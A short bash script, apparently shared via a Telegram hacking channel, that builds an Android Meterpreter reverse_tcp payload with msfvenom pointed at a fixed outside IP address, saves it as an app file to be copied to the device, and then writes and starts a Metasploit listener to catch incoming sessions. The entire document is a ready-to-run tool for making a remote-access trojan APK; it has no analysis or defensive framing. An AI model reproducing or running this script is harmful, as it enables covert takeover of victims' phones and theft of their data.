#!/bin/bash
clear='\033[0m'
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White

echo
echo
echo -e "${IWhite}// ${IGreen}JOIN FOR MORE${clear} ${IYellow}t.me/efxtv${clear} ${IWhite}//${clear}"

echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please enter VPORT: ${IYellow}"
read lport

echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Enter output app n: ${IYellow}"
read op

echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Generating payload "
echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please wait... "
sleep 3

msfvenom -p android/meterpreter/reverse_tcp lhost=193.161.193.99 lport=$lport R > $op

echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Payload generated... "
echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Starting please wait... "
echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Copy $op to sdcard [cp $op /sdcard/] "
echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Starting metasploit listener... "
sleep 3

echo -e "# msfconsole -q -r 'export.rc'
# nano export.r
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 5576
set ExitOnSession false
set EnableStageEncoding true
run -j" >export.rc
msfconsole -q -r 'export.rc'

